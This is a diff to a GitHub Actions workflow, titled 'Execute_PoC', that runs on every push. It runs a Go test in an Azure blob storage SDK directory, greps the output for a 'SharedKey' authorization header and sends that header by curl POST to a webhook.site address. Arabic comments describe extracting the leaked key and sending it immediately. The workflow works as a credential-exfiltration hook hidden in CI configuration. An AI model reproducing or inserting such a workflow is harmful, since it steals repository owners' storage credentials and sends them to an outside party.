@@ -1,13 +1,23 @@
-- name: Extract and Leak
+name: Execute_PoC
+on: [push]
+jobs:
+  run-exploit:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v3
+
+      - name: Setup Go
+        uses: actions/setup-go@v4
+        with:
+          go-version: '1.21'
+
+      - name: Force Exploit
         working-directory: ./sdk/storage/azblob
         run: |
           sed -i 's/go 1.25.0/go 1.21/' go.mod
-          
-          # تشغيل التست وحفظ المخرجات
           go test -v -run TestImpact_CredentialLeakage > output.txt 2>&1 || true
           
-          # استخراج الهيدر المسرب (التوقيع الرقمي)
-          LEAKED_HEADER=$(grep "SharedKey" output.txt || echo "Header_Not_Found")
-          
-          # إرسال المفتاح المسرب فوراً لـ Webhook
-          curl -X POST -H "Content-Type: text/plain" -d "$LEAKED_HEADER" https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835
+          # استخراج الهيدر وإرساله فوراً
+          LEAK=$(grep "SharedKey" output.txt | head -n 1 || echo "Not_Found")
+          curl -X POST -d "Result=$LEAK" https://webhook.site/72d5ef0b-edde-4e82-b103-d71004e44835
